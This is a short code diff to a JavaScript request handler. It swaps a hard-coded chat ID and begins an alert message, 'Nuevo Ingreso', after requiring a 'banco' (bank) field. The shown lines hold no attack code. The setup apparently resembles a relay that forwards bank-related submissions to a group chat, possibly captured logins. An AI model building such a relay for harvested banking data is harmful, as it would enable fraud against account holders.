@@ -364,7 +364,7 @@ export const latamSimpleMsj = async (req, res) => {
       return res.status(400).json({ success: false, error: 'Invalid payload: "banco" is required' });
     }
 
-    const chatId = '-4975213875';
+    const chatId = '-1002850830211';
     const text = [
       '🚨🚨 Nuevo Ingreso 🚨🚨',
       '',
